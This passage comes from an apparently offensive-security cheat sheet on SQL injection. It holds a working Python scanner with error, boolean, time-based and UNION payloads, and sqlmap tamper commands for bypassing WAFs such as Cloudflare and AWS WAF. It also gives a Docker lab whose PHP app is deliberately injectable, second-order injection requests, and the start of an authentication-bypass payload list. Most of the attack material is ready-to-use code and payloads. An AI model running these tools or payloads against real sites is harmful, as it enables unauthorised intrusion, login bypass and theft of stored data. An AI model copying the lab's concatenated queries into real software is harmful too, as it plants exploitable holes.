          ("' AND 1=1 --", "' AND 1=2 --"),
          (" AND 1=1", " AND 1=2"),
          ("' OR '1'='1", "' OR '1'='2"),
          (") AND (1=1", ") AND (1=2"),
      ]

      TIME_PAYLOADS = {
          'mysql': "' AND SLEEP({delay}) --",
          'postgresql': "'; SELECT pg_sleep({delay}); --",
          'mssql': "'; WAITFOR DELAY '0:0:{delay}'; --",
          'oracle': "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{delay}) --",
          'generic': "' AND SLEEP({delay}) --",
      }

      ERROR_PAYLOADS = [
          "'",
          "''",
          "'--",
          "' OR '",
          "' AND '",
          "1'",
          "1 OR 1=1",
          "' OR ''='",
          "'; --",
          "') OR ('1'='1",
      ]

      UNION_PAYLOADS = [
          "' UNION SELECT NULL--",
          "' UNION SELECT NULL,NULL--",
          "' UNION SELECT NULL,NULL,NULL--",
          "' UNION SELECT NULL,NULL,NULL,NULL--",
          "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
          "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
      ]

      def __init__(self, target_url, method='GET', data=None, cookies=None, headers=None):
          self.target = target_url
          self.method = method.upper()
          self.data = data
          self.cookies = cookies or {}
          self.custom_headers = headers or {}
          self.results: List[SQLiResult] = []
          self.session = requests.Session()
          self.session.headers.update({
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
              **self.custom_headers
          })
          if cookies:
              self.session.cookies.update(cookies)
          self.baseline = None
          self.detected_db = 'unknown'

      def _send_request(self, url, params=None, data=None):
          """Send request and return response"""
          try:
              if self.method == 'GET':
                  resp = self.session.get(url, params=params, timeout=30, allow_redirects=True)
              else:
                  resp = self.session.post(url, data=data or params, timeout=30, allow_redirects=True)
              return resp
          except requests.exceptions.Timeout:
              return None
          except requests.exceptions.RequestException as e:
              return None

      def _inject_payload(self, param, payload) -> Optional[requests.Response]:
          """Inject payload into specified parameter"""
          parsed = urlparse(self.target)
          params = parse_qs(parsed.query, keep_blank_values=True)
          
          if self.method == 'GET':
              if param in params:
                  original = params[param][0]
                  params[param] = [original + payload]
                  new_query = urlencode(params, doseq=True)
                  new_url = urlunparse(parsed._replace(query=new_query))
                  return self._send_request(new_url)
              else:
                  return None
          else:
              if self.data:
                  modified = dict(self.data)
                  if param in modified:
                      modified[param] = modified[param] + payload
                      return self._send_request(self.target, data=modified)
              return None

      def get_baseline(self, param):
          """Get normal response for comparison"""
          resp = self._inject_payload(param, "")
          if resp:
              self.baseline = {
                  'status': resp.status_code,
                  'length': len(resp.text),
                  'body': resp.text
              }
          return self.baseline

      def detect_db_type(self, response_text):
          """Identify database from error messages"""
          for db_type, patterns in self.DB_ERRORS.items():
              for pattern in patterns:
                  if re.search(pattern, response_text, re.IGNORECASE):
                      return db_type
          return 'unknown'

      def test_error_based(self, param):
          """Test for error-based SQL injection"""
          print(f"\n  [*] Testing Error-Based on '{param}'...")
          
          for payload in self.ERROR_PAYLOADS:
              resp = self._inject_payload(param, payload)
              if resp is None:
                  continue
              
              db_type = self.detect_db_type(resp.text)
              
              if db_type != 'unknown':
                  self.detected_db = db_type
                  result = SQLiResult(
                      parameter=param,
                      technique="Error-Based",
                      payload=payload,
                      vulnerable=True,
                      evidence=f"Database error detected: {db_type}",
                      severity="high",
                      database_type=db_type
                  )
                  self.results.append(result)
                  print(f"    🔴 VULNERABLE — {db_type} error with payload: {payload[:50]}")
                  return result
              
              # Check for generic errors
              if self.baseline and abs(len(resp.text) - self.baseline['length']) > 50:
                  if resp.status_code == 500 or 'error' in resp.text.lower():
                      result = SQLiResult(
                          parameter=param,
                          technique="Error-Based",
                          payload=payload,
                          vulnerable=True,
                          evidence=f"Server error triggered (HTTP {resp.status_code})",
                          severity="medium",
                          database_type="unknown"
                      )
                      self.results.append(result)
                      print(f"    🟡 Possible — Server error with: {payload[:50]}")
                      return result
              
              time.sleep(0.3)
          
          print(f"    🟢 No error-based injection detected")
          return None

      def test_boolean_based(self, param):
          """Test for boolean-based blind SQL injection"""
          print(f"\n  [*] Testing Boolean-Based on '{param}'...")
          
          for true_payload, false_payload in self.BOOLEAN_PAYLOADS:
              resp_true = self._inject_payload(param, true_payload)
              time.sleep(0.3)
              resp_false = self._inject_payload(param, false_payload)
              
              if resp_true is None or resp_false is None:
                  continue
              
              # Compare responses
              len_diff = abs(len(resp_true.text) - len(resp_false.text))
              
              if len_diff > 10 and resp_true.status_code == resp_false.status_code:
                  # Verify it's not random variation
                  resp_verify = self._inject_payload(param, true_payload)
                  if resp_verify and abs(len(resp_verify.text) - len(resp_true.text)) < 5:
                      result = SQLiResult(
                          parameter=param,
                          technique="Boolean-Based Blind",
                          payload=f"TRUE: {true_payload} | FALSE: {false_payload}",
                          vulnerable=True,
                          evidence=f"Response length diff: {len_diff} bytes (true={len(resp_true.text)}, false={len(resp_false.text)})",
                          severity="high",
                          database_type=self.detected_db
                      )
                      self.results.append(result)
                      print(f"    🔴 VULNERABLE — Boolean diff: {len_diff} bytes")
                      return result
              
              if resp_true.status_code != resp_false.status_code:
                  result = SQLiResult(
                      parameter=param,
                      technique="Boolean-Based Blind",
                      payload=f"TRUE: {true_payload} | FALSE: {false_payload}",
                      vulnerable=True,
                      evidence=f"Status code diff: true={resp_true.status_code}, false={resp_false.status_code}",
                      severity="high",
                      database_type=self.detected_db
                  )
                  self.results.append(result)
                  print(f"    🔴 VULNERABLE — Status diff: {resp_true.status_code} vs {resp_false.status_code}")
                  return result
              
              time.sleep(0.3)
          
          print(f"    🟢 No boolean-based injection detected")
          return None

      def test_time_based(self, param, delay=5):
          """Test for time-based blind SQL injection"""
          print(f"\n  [*] Testing Time-Based on '{param}' (delay={delay}s)...")
          
          for db_name, payload_template in self.TIME_PAYLOADS.items():
              payload = payload_template.format(delay=delay)
              
              start = time.time()
              resp = self._inject_payload(param, payload)
              elapsed = time.time() - start
              
              if resp is None and elapsed >= delay - 1:
                  # Timeout could indicate delay worked
                  result = SQLiResult(
                      parameter=param,
                      technique="Time-Based Blind",
                      payload=payload,
                      vulnerable=True,
                      evidence=f"Request timed out (>{delay}s) — {db_name} delay payload",
                      severity="high",
                      database_type=db_name
                  )
                  self.results.append(result)
                  self.detected_db = db_name
                  print(f"    🔴 VULNERABLE — {db_name} delay ({elapsed:.1f}s)")
                  return result
              
              if resp and elapsed >= delay - 1:
                  # Verify with no-delay baseline
                  start2 = time.time()
                  self._inject_payload(param, "' AND 1=1 --")
                  baseline_time = time.time() - start2
                  
                  if elapsed > baseline_time + delay - 1:
                      result = SQLiResult(
                          parameter=param,
                          technique="Time-Based Blind",
                          payload=payload,
                          vulnerable=True,
                          evidence=f"Delay detected: {elapsed:.1f}s vs baseline {baseline_time:.1f}s — {db_name}",
                          severity="high",
                          database_type=db_name
                      )
                      self.results.append(result)
                      self.detected_db = db_name
                      print(f"    🔴 VULNERABLE — {db_name} ({elapsed:.1f}s vs {baseline_time:.1f}s)")
                      return result
              
              time.sleep(0.5)
          
          print(f"    🟢 No time-based injection detected")
          return None

      def test_union_based(self, param):
          """Test for UNION-based SQL injection"""
          print(f"\n  [*] Testing UNION-Based on '{param}'...")
          
          for payload in self.UNION_PAYLOADS:
              resp = self._inject_payload(param, payload)
              if resp is None:
                  continue
              
              null_count = payload.count('NULL')
              
              if self.baseline:
                  if len(resp.text) > self.baseline['length'] + 10:
                      if resp.status_code == 200:
                          result = SQLiResult(
                              parameter=param,
                              technique="UNION-Based",
                              payload=payload,
                              vulnerable=True,
                              evidence=f"Response grew by {len(resp.text) - self.baseline['length']} bytes with {null_count} columns",
                              severity="critical",
                              database_type=self.detected_db
                          )
                          self.results.append(result)
                          print(f"    🔴 VULNERABLE — UNION with {null_count} columns (+{len(resp.text) - self.baseline['length']} bytes)")
                          return result
              
              time.sleep(0.3)
          
          print(f"    🟢 No UNION-based injection detected")
          return None

      def scan_parameter(self, param):
          """Run all tests against a single parameter"""
          print(f"\n{'='*60}")
          print(f" Scanning parameter: {param}")
          print(f"{'='*60}")
          
          self.get_baseline(param)
          self.test_error_based(param)
          self.test_boolean_based(param)
          self.test_time_based(param)
          self.test_union_based(param)

      def scan_all_parameters(self):
          """Scan all discovered parameters"""
          parsed = urlparse(self.target)
          params = parse_qs(parsed.query, keep_blank_values=True)
          
          if not params and not self.data:
              print("[-] No parameters found to test")
              return
          
          print(f"\n{'='*60}")
          print(f" SQL Injection Scanner")
          print(f" Target: {self.target}")
          print(f" Method: {self.method}")
          print(f" Parameters: {list(params.keys()) if params else list(self.data.keys() if self.data else [])}")
          print(f"{'='*60}")
          
          test_params = list(params.keys()) if params else list(self.data.keys() if self.data else [])
          
          for param in test_params:
              self.scan_parameter(param)
          
          self.generate_report()

      def generate_report(self):
          """Generate final report"""
          vulnerable = [r for r in self.results if r.vulnerable]
          
          report = {
              "target": self.target,
              "method": self.method,
              "total_tests": len(self.results),
              "vulnerabilities": len(vulnerable),
              "detected_database": self.detected_db,
              "results": [asdict(r) for r in self.results]
          }
          
          filename = "sqli_scan_report.json"
          with open(filename, 'w') as f:
              json.dump(report, f, indent=2)
          
          print(f"\n{'='*60}")
          print(f" SCAN COMPLETE")
          print(f"{'='*60}")
          print(f" Vulnerabilities found: {len(vulnerable)}")
          print(f" Database detected:     {self.detected_db}")
          print(f" Report saved:          {filename}")
          
          if vulnerable:
              print(f"\n 🔴 VULNERABLE FINDINGS:")
              for v in vulnerable:
                  print(f"    [{v.technique}] {v.parameter}: {v.evidence}")
          
          print(f"{'='*60}")


  if __name__ == "__main__":
      if len(sys.argv) < 2:
          print(f"Usage: {sys.argv[0]} <url_with_params>")
          print(f"Example: {sys.argv[0]} 'https://target.com/page?id=1&search=test'")
          sys.exit(1)
      
      scanner = SQLiScanner(sys.argv[1])
      scanner.scan_all_parameters()
  ```

  ::
  :::

  :::tabs-item{icon="i-lucide-list" label="sqlmap Tamper Scripts"}

  | Tamper Script | Function | Effective Against |
  |---|---|---|
  | `space2comment` | Replaces spaces with `/**/` | ModSecurity, generic WAFs |
  | `between` | Replaces `>` with `NOT BETWEEN 0 AND` | Keyword-based filters |
  | `randomcase` | Randomizes keyword case | Case-sensitive filters |
  | `charencode` | URL-encodes all characters | Basic URL filters |
  | `chardoubleencode` | Double URL-encodes | Double-decode WAFs |
  | `space2dash` | Replaces spaces with `--\n` | Space-based filters |
  | `space2hash` | Replaces spaces with `#\n` | MySQL-specific WAFs |
  | `space2mssqlblank` | Uses MSSQL whitespace chars | MSSQL filters |
  | `equaltolike` | Replaces `=` with `LIKE` | Equal sign filters |
  | `greatest` | Replaces `>` with `GREATEST` | Comparison filters |
  | `apostrophemask` | UTF-8 encoding of `'` | Quote filters |
  | `base64encode` | Base64 encodes payload | Basic filters |
  | `percentage` | Adds `%` between chars | IDS evasion |
  | `versionedmorekeywords` | MySQL version comments | MySQL WAFs |
  | `halfversionedmorekeywords` | Partial version comments | MySQL WAFs |

  ```bash [Recommended Tamper Combinations]
  # Generic WAF bypass
  sqlmap -u "URL" --tamper="space2comment,between,randomcase,charencode"

  # Cloudflare bypass
  sqlmap -u "URL" --tamper="between,randomcase,space2comment,equaltolike"

  # ModSecurity bypass
  sqlmap -u "URL" --tamper="space2comment,versionedmorekeywords,charencode"

  # AWS WAF bypass
  sqlmap -u "URL" --tamper="space2dash,between,charencode,randomcase"

  # Aggressive bypass
  sqlmap -u "URL" --tamper="apostrophemask,between,charencode,chardoubleencode,equaltolike,greatest,halfversionedmorekeywords,percentage,randomcase,space2comment,space2dash,space2hash,unionalltounion,versionedmorekeywords"
  ```
  :::
::

---

## Vulnerable Lab — Docker Compose

::code-collapse

```yaml [docker-compose.yml]
version: '3.8'

services:
  # MySQL-based vulnerable app
  sqli-mysql-app:
    build:
      context: ./mysql-app
      dockerfile: Dockerfile
    ports:
      - "8080:80"
    environment:
      - DB_HOST=mysql
      - DB_NAME=sqli_lab
      - DB_USER=labuser
      - DB_PASS=labpass123
    depends_on:
      mysql:
        condition: service_healthy
    networks:
      - lab-net
    restart: unless-stopped

  # MySQL Database
  mysql:
    image: mysql:8.0
    environment:
      MYSQL_ROOT_PASSWORD: rootpass
      MYSQL_DATABASE: sqli_lab
      MYSQL_USER: labuser
      MYSQL_PASSWORD: labpass123
    volumes:
      - mysql-data:/var/lib/mysql
      - ./init-mysql.sql:/docker-entrypoint-initdb.d/01-init.sql
      - ./seed-mysql.sql:/docker-entrypoint-initdb.d/02-seed.sql
    ports:
      - "3306:3306"
    healthcheck:
      test: ["CMD", "mysqladmin", "ping", "-h", "localhost", "-u", "root", "-prootpass"]
      interval: 5s
      timeout: 5s
      retries: 10
    networks:
      - lab-net

  # PostgreSQL-based vulnerable app
  sqli-pg-app:
    build:
      context: ./pg-app
      dockerfile: Dockerfile
    ports:
      - "8081:3000"
    environment:
      - DB_HOST=postgres
      - DB_NAME=sqli_lab
      - DB_USER=labuser
      - DB_PASS=labpass123
    depends_on:
      postgres:
        condition: service_healthy
    networks:
      - lab-net

  # PostgreSQL Database
  postgres:
    image: postgres:16-alpine
    environment:
      POSTGRES_DB: sqli_lab
      POSTGRES_USER: labuser
      POSTGRES_PASSWORD: labpass123
    volumes:
      - pg-data:/var/lib/postgresql/data
      - ./init-postgres.sql:/docker-entrypoint-initdb.d/init.sql
    ports:
      - "5432:5432"
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U labuser -d sqli_lab"]
      interval: 5s
      timeout: 5s
      retries: 5
    networks:
      - lab-net

  # MongoDB for NoSQL injection
  mongo:
    image: mongo:7
    ports:
      - "27017:27017"
    volumes:
      - mongo-data:/data/db
      - ./init-mongo.js:/docker-entrypoint-initdb.d/init.js
    networks:
      - lab-net

  # NoSQL vulnerable app
  nosql-app:
    build:
      context: ./nosql-app
      dockerfile: Dockerfile
    ports:
      - "8082:3000"
    environment:
      - MONGO_URI=mongodb://mongo:27017/sqli_lab
    depends_on:
      - mongo
    networks:
      - lab-net

  # SQLite vulnerable app
  sqlite-app:
    build:
      context: ./sqlite-app
      dockerfile: Dockerfile
    ports:
      - "8083:5000"
    volumes:
      - sqlite-data:/app/data
    networks:
      - lab-net

  # phpMyAdmin for database inspection
  phpmyadmin:
    image: phpmyadmin:latest
    ports:
      - "8090:80"
    environment:
      PMA_HOST: mysql
      PMA_USER: root
      PMA_PASSWORD: rootpass
    depends_on:
      - mysql
    networks:
      - lab-net

  # Adminer for PostgreSQL inspection
  adminer:
    image: adminer:latest
    ports:
      - "8091:8080"
    networks:
      - lab-net

  # Request proxy
  mitmproxy:
    image: mitmproxy/mitmproxy:latest
    ports:
      - "9090:8080"
      - "9091:8081"
    command: mitmweb --web-host 0.0.0.0 --listen-port 8080 --web-port 8081
    networks:
      - lab-net

volumes:
  mysql-data:
  pg-data:
  mongo-data:
  sqlite-data:

networks:
  lab-net:
    driver: bridge
```

::

::code-collapse

```sql [init-mysql.sql]
-- MySQL Vulnerable Lab Database

-- Enable file operations
SET GLOBAL local_infile = 1;

-- Users table (intentionally stores weak hashes)
CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(100) NOT NULL UNIQUE,
    password VARCHAR(255) NOT NULL,
    email VARCHAR(255),
    role VARCHAR(20) DEFAULT 'user',
    full_name VARCHAR(200),
    phone VARCHAR(20),
    address TEXT,
    ssn VARCHAR(11),
    credit_card VARCHAR(20),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Products table
CREATE TABLE IF NOT EXISTS products (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(200) NOT NULL,
    description TEXT,
    price DECIMAL(10,2),
    category VARCHAR(100),
    stock INT DEFAULT 0,
    image_url VARCHAR(500)
);

-- Orders table
CREATE TABLE IF NOT EXISTS orders (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT,
    product_id INT,
    quantity INT,
    total DECIMAL(10,2),
    status VARCHAR(20) DEFAULT 'pending',
    shipping_address TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id),
    FOREIGN KEY (product_id) REFERENCES products(id)
);

-- Messages / Support tickets
CREATE TABLE IF NOT EXISTS messages (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT,
    subject VARCHAR(255),
    body TEXT,
    is_private BOOLEAN DEFAULT TRUE,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id)
);

-- Admin settings (sensitive)
CREATE TABLE IF NOT EXISTS admin_settings (
    id INT AUTO_INCREMENT PRIMARY KEY,
    setting_key VARCHAR(100) UNIQUE,
    setting_value TEXT,
    is_secret BOOLEAN DEFAULT FALSE
);

-- API keys
CREATE TABLE IF NOT EXISTS api_keys (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT,
    api_key VARCHAR(64),
    permissions VARCHAR(255),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id)
);

-- Audit log
CREATE TABLE IF NOT EXISTS audit_log (
    id INT AUTO_INCREMENT PRIMARY KEY,
    action VARCHAR(100),
    details TEXT,
    ip_address VARCHAR(45),
    user_agent TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
```

::

::code-collapse

```sql [seed-mysql.sql]
-- Seed data for SQLi Lab

INSERT INTO users (username, password, email, role, full_name, phone, ssn, credit_card) VALUES
('admin', MD5('SuperSecret@dm1n!'), 'admin@target.com', 'admin', 'System Administrator', '+1-555-0100', '123-45-6789', '4111111111111111'),
('john_doe', MD5('john_password_123'), 'john@example.com', 'user', 'John Doe', '+1-555-0101', '234-56-7890', '4222222222222222'),
('jane_smith', MD5('jane_secure_456'), 'jane@example.com', 'user', 'Jane Smith', '+1-555-0102', '345-67-8901', '5111111111111111'),
('bob_wilson', MD5('bob_pass_789'), 'bob@example.com', 'moderator', 'Bob Wilson', '+1-555-0103', '456-78-9012', '5222222222222222'),
('alice_jones', MD5('alice_key_012'), 'alice@example.com', 'user', 'Alice Jones', '+1-555-0104', '567-89-0123', '371111111111111'),
('charlie_brown', MD5('charlie_pwd'), 'charlie@example.com', 'user', 'Charlie Brown', '+1-555-0105', '678-90-1234', '6011111111111111'),
('diana_prince', MD5('wonder_woman'), 'diana@example.com', 'admin', 'Diana Prince', '+1-555-0106', '789-01-2345', '3711111111111111'),
('service_account', MD5('svc_internal_key'), 'svc@internal.com', 'service', 'Service Account', NULL, NULL, NULL);

INSERT INTO products (name, description, price, category, stock) VALUES
('Laptop Pro X1', 'High-performance laptop with 16GB RAM', 1299.99, 'Electronics', 50),
('Wireless Mouse', 'Ergonomic wireless mouse', 29.99, 'Accessories', 200),
('USB-C Hub', '7-in-1 USB-C hub with HDMI', 49.99, 'Accessories', 150),
('Monitor 27"', '4K IPS display monitor', 399.99, 'Electronics', 75),
('Keyboard Mech', 'Mechanical keyboard with RGB', 89.99, 'Accessories', 120),
('Webcam HD', '1080p HD webcam with microphone', 69.99, 'Electronics', 90),
('SSD 1TB', 'NVMe SSD 1TB high speed', 109.99, 'Storage', 200),
('RAM 32GB', 'DDR5 32GB memory kit', 149.99, 'Components', 80);

INSERT INTO orders (user_id, product_id, quantity, total, status, shipping_address) VALUES
(1, 1, 1, 1299.99, 'completed', '100 Admin St, HQ City'),
(2, 2, 2, 59.98, 'shipped', '200 User Ave, Town'),
(2, 5, 1, 89.99, 'pending', '200 User Ave, Town'),
(3, 4, 1, 399.99, 'completed', '300 Oak Blvd, City'),
(4, 7, 3, 329.97, 'processing', '400 Pine St, Village'),
(5, 1, 1, 1299.99, 'shipped', '500 Elm Dr, Metro');

INSERT INTO messages (user_id, subject, body, is_private) VALUES
(1, 'System Maintenance', 'Scheduled maintenance on Saturday 2AM-4AM', FALSE),
(2, 'Password Issue', 'I forgot my password, please help. My old password was john_password_123', TRUE),
(3, 'Order Complaint', 'My monitor arrived damaged', TRUE),
(1, 'Internal: DB Credentials', 'Production DB: admin/Pr0d_DB_P@ss_2024! Host: 10.0.1.50', TRUE),
(4, 'Feature Request', 'Please add dark mode to the dashboard', FALSE);

INSERT INTO admin_settings (setting_key, setting_value, is_secret) VALUES
('site_name', 'SQLi Lab Application', FALSE),
('admin_email', 'admin@target.com', FALSE),
('db_backup_key', 'AES256_KEY_xK9mP2nQ4rS6tU8v', TRUE),
('aws_access_key', 'AKIAIOSFODNN7EXAMPLE', TRUE),
('aws_secret_key', 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY', TRUE),
('stripe_secret', 'sk_live_4eC39HqLyjWDarjtT1zdp7dc', TRUE),
('jwt_secret', 'super_secret_jwt_key_do_not_share_2024!', TRUE),
('encryption_key', 'b3BlbnNlc2FtZTEyMzQ1Njc4OTAxMjM0NTY3ODkwMTI=', TRUE);

INSERT INTO api_keys (user_id, api_key, permissions) VALUES
(1, 'sk_admin_key_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx', 'read,write,delete,admin'),
(2, 'sk_user_john_yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy', 'read'),
(4, 'sk_mod_bob_zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz', 'read,write,moderate'),
(7, 'sk_admin_diana_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', 'read,write,delete,admin'),
(8, 'sk_svc_internal_bbbbbbbbbbbbbbbbbbbbbbbbbbbbbb', 'read,write,internal');
```

::

::code-collapse

```php [mysql-app/index.php]
<?php
/**
 * VULNERABLE SQL INJECTION LAB
 * This application is intentionally vulnerable
 * FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY
 */

$db_host = getenv('DB_HOST') ?: 'localhost';
$db_name = getenv('DB_NAME') ?: 'sqli_lab';
$db_user = getenv('DB_USER') ?: 'labuser';
$db_pass = getenv('DB_PASS') ?: 'labpass123';

try {
    $pdo = new PDO("mysql:host=$db_host;dbname=$db_name", $db_user, $db_pass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Connection failed: " . $e->getMessage());
}

$page = $_GET['page'] ?? 'home';

// ===== VULNERABLE ENDPOINTS =====

// 1. Product search — UNION-based SQLi
if ($page === 'search') {
    $search = $_GET['q'] ?? '';
    // VULNERABLE — Direct concatenation
    $sql = "SELECT * FROM products WHERE name LIKE '%$search%' OR description LIKE '%$search%'";
    
    try {
        $result = $pdo->query($sql);
        $products = $result->fetchAll(PDO::FETCH_ASSOC);
        
        header('Content-Type: application/json');
        echo json_encode(['query' => $sql, 'results' => $products]);
    } catch (PDOException $e) {
        // VULNERABLE — Error messages exposed
        header('Content-Type: application/json');
        echo json_encode(['error' => $e->getMessage(), 'query' => $sql]);
    }
}

// 2. Product detail — Numeric injection
elseif ($page === 'product') {
    $id = $_GET['id'] ?? '1';
    // VULNERABLE — No input validation
    $sql = "SELECT * FROM products WHERE id = $id";
    
    try {
        $result = $pdo->query($sql);
        $product = $result->fetch(PDO::FETCH_ASSOC);
        
        header('Content-Type: application/json');
        echo json_encode(['query' => $sql, 'product' => $product]);
    } catch (PDOException $e) {
        header('Content-Type: application/json');
        echo json_encode(['error' => $e->getMessage()]);
    }
}

// 3. Login — Authentication bypass
elseif ($page === 'login') {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $username = $_POST['username'] ?? '';
        $password = $_POST['password'] ?? '';
        
        // VULNERABLE — SQL injection in login
        $sql = "SELECT * FROM users WHERE username = '$username' AND password = MD5('$password')";
        
        try {
            $result = $pdo->query($sql);
            $user = $result->fetch(PDO::FETCH_ASSOC);
            
            header('Content-Type: application/json');
            if ($user) {
                echo json_encode(['success' => true, 'user' => $user, 'query' => $sql]);
            } else {
                echo json_encode(['success' => false, 'message' => 'Invalid credentials', 'query' => $sql]);
            }
        } catch (PDOException $e) {
            header('Content-Type: application/json');
            echo json_encode(['error' => $e->getMessage(), 'query' => $sql]);
        }
    }
}

// 4. User profile — Blind SQLi
elseif ($page === 'profile') {
    $username = $_GET['user'] ?? 'admin';
    // VULNERABLE — Blind injection point
    $sql = "SELECT username, email, full_name, role FROM users WHERE username = '$username'";
    
    try {
        $result = $pdo->query($sql);
        $user = $result->fetch(PDO::FETCH_ASSOC);
        
        header('Content-Type: application/json');
        if ($user) {
            echo json_encode(['exists' => true, 'profile' => $user]);
        } else {
            echo json_encode(['exists' => false]);
        }
    } catch (PDOException $e) {
        header('Content-Type: application/json');
        echo json_encode(['exists' => false]);
    }
}

// 5. Sort/Order — ORDER BY injection
elseif ($page === 'list') {
    $sort = $_GET['sort'] ?? 'id';
    $order = $_GET['order'] ?? 'ASC';
    // VULNERABLE — Injection in ORDER BY
    $sql = "SELECT id, name, price, category FROM products ORDER BY $sort $order";
    
    try {
        $result = $pdo->query($sql);
        $products = $result->fetchAll(PDO::FETCH_ASSOC);
        
        header('Content-Type: application/json');
        echo json_encode(['products' => $products]);
    } catch (PDOException $e) {
        header('Content-Type: application/json');
        echo json_encode(['error' => $e->getMessage()]);
    }
}

// 6. Stacked query — via category filter
elseif ($page === 'category') {
    $cat = $_GET['cat'] ?? 'Electronics';
    // VULNERABLE — Stacked queries possible
    $sql = "SELECT * FROM products WHERE category = '$cat'";
    
    try {
        // Using exec allows stacked queries
        $pdo->exec($sql);
        $result = $pdo->query($sql);
        $products = $result->fetchAll(PDO::FETCH_ASSOC);
        
        header('Content-Type: application/json');
        echo json_encode(['products' => $products]);
    } catch (PDOException $e) {
        header('Content-Type: application/json');
        echo json_encode(['error' => $e->getMessage()]);
    }
}

// 7. Header injection — User-Agent logging
elseif ($page === 'visit') {
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    
    // VULNERABLE — Header values in SQL
    $sql = "INSERT INTO audit_log (action, details, ip_address, user_agent) VALUES ('page_visit', 'Home page', '$ip', '$ua')";
    
    try {
        $pdo->exec($sql);
        header('Content-Type: application/json');
        echo json_encode(['logged' => true]);
    } catch (PDOException $e) {
        header('Content-Type: application/json');
        echo json_encode(['error' => $e->getMessage()]);
    }
}

// Default — Lab info
else {
    header('Content-Type: application/json');
    echo json_encode([
        'lab' => 'SQL Injection Lab',
        'endpoints' => [
            'GET /index.php?page=search&q=INJECT_HERE',
            'GET /index.php?page=product&id=INJECT_HERE',
            'POST /index.php?page=login (username & password)',
            'GET /index.php?page=profile&user=INJECT_HERE',
            'GET /index.php?page=list&sort=INJECT_HERE&order=INJECT_HERE',
            'GET /index.php?page=category&cat=INJECT_HERE',
            'GET /index.php?page=visit (User-Agent & X-Forwarded-For headers)',
        ],
        'note' => 'This application is intentionally vulnerable. For educational use only.'
    ]);
}
?>
```

::

---

## Second-Order SQL Injection

::note
Second-order SQLi is uniquely dangerous because the malicious payload is **stored safely** in the database during the first interaction and **executed unsafely** when the data is later retrieved and used in another query.
::

::tabs
  :::tabs-item{icon="i-lucide-pen" label="Injection Phase (Store)"}

  ::code-group
  ```http [Register with SQLi Username]
  POST /register HTTP/1.1
  Content-Type: application/json

  {
    "username": "admin'-- ",
    "email": "attacker@evil.com",
    "password": "password123"
  }

  # The username "admin'-- " is stored safely via parameterized INSERT
  # INSERT INTO users (username, email, password) VALUES (?, ?, ?)
  # No injection here — it's stored as a string
  ```

  ```http [Update Profile with SQLi Payload]
  PUT /api/profile HTTP/1.1
  Content-Type: application/json
  Authorization: Bearer valid_token

  {
    "display_name": "' UNION SELECT password FROM users WHERE username='admin' -- ",
    "bio": "Just a regular user"
  }
  ```

  ```http [Support Ticket with SQLi]
  POST /api/tickets HTTP/1.1
  Content-Type: application/json
  Authorization: Bearer valid_token

  {
    "subject": "Help needed",
    "body": "'; UPDATE users SET role='admin' WHERE username='attacker'; -- "
  }
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-play" label="Execution Phase (Trigger)"}

  ::code-group
  ```text [Password Change — Triggers with Stored Username]
  # User "admin'-- " changes their password
  # Application retrieves username from session/database

  # Vulnerable backend code:
  # username = get_username_from_session()  → returns "admin'-- "
  # sql = f"UPDATE users SET password='{new_hash}' WHERE username='{username}'"
  
  # Resulting SQL:
  # UPDATE users SET password='new_hash' WHERE username='admin'-- '
  # This updates the REAL admin's password!
  ```

  ```text [Profile View — Triggers UNION in Display Query]
  # Admin views user profiles
  # Application retrieves display_name and uses it in another query

  # sql = f"SELECT * FROM posts WHERE author = '{display_name}'"
  # display_name = "' UNION SELECT password FROM users WHERE username='admin' -- "

  # Resulting SQL:
  # SELECT * FROM posts WHERE author = '' UNION SELECT password FROM users WHERE username='admin' -- '
  # Admin's password hash is returned in the post listing!
  ```

  ```text [Report Generation — Triggers Stored Payload]
  # Nightly report job queries user-submitted data
  # Ticket body is used unsafely in aggregation query

  # sql = f"INSERT INTO reports (content) SELECT body FROM tickets WHERE subject = '{subject}'"
  # If body contains: '; UPDATE users SET role='admin' WHERE username='attacker'; --
  # The stacked query executes during report generation
  ```
  ::
  :::
::

---

## Comprehensive Payload Collection

::code-collapse

```text [sqli_master_payloads.txt]
# =====================================================
# SQL INJECTION — MASTER PAYLOAD COLLECTION
# For authorized penetration testing only
# =====================================================

# === AUTHENTICATION BYPASS ===
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' #
' OR '1'='1'/*
' OR 1=1 --
' OR 1=1 #
admin' --
admin' #
admin'/*
') OR ('1'='1
') OR ('1'='1' --
' OR 'x'='x
' OR ''='
" OR "1"="1
" OR "1"="1" --
admin" --
" OR ""="
') OR '1'='1' --
1' OR '1'='1
' OR 1=1 LIMIT 1 --
